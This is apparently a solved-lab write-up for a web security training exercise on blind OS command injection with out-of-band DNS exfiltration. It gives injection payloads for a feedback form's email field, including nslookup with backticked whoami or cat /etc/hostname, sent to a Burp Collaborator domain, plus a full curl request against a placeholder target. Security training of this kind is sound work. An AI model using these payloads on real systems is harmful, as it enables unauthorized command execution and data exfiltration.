# Blind OS command injection with out-of-band data exfiltration — Practitioner

**Status:** Solved

---

## Goal

Use out-of-band techniques to exfiltrate data. Execute `whoami` and send the output to your Burp Collaborator server.

---

## Steps (simple & complete)

1. **Get Burp Collaborator domain**
   - Burp Suite → Burp Collaborator client
   - Click "Copy to clipboard"
   - Example: `abc123.burpcollaborator.net`

2. **Find injection point**
   - Submit feedback form
   - Intercept in Burp Suite
   - Email parameter is vulnerable

3. **Inject command with data exfiltration**
```
   email=x||nslookup `whoami`.abc123.burpcollaborator.net||
```
   - The backticks execute `whoami` first
   - Result gets prepended to your domain
   - Creates DNS lookup like: `peter-webapp.abc123.burpcollaborator.net`

4. **Execute the injection**
```bash
   curl -X POST "https://TARGET/feedback/submit" \
     -d "email=x||nslookup \`whoami\`.abc123.burpcollaborator.net||&name=test&subject=test&message=test"
```

5. **Check Collaborator for data**
   - Go to Burp Collaborator client
   - Click "Poll now"
   - Look at the DNS query subdomain

6. **Extract username from DNS query**
   - You'll see something like:
```
   DNS Query: peter-webapp.abc123.burpcollaborator.net
```
   - The username is `peter-webapp`!

7. **Lab solved**
   - Once you successfully exfiltrate the whoami output

---

## Example

**Injection:**
```
email=x||nslookup `whoami`.abc123.burpcollaborator.net||
```

**Collaborator receives:**
```
DNS Query: peter-webapp.abc123.burpcollaborator.net   
          ^^^^^^^^^^^^
          This is the whoami output!
```

---

## Alternative syntax

If backticks dont work, try:
```
email=x||nslookup $(whoami).abc123.burpcollaborator.net||
```

For more data:
```
email=x||nslookup `cat /etc/hostname`.abc123.burpcollaborator.net||
```

---

## Why this works

1. Server executes: `` `whoami` `` → returns `peter-webapp`
2. Becomes: `nslookup peter-webapp.abc123.burpcollaborator.net`
3. Server makes DNS request with the data embedded
4. Your Collaborator recieves it and shows you the data!

---

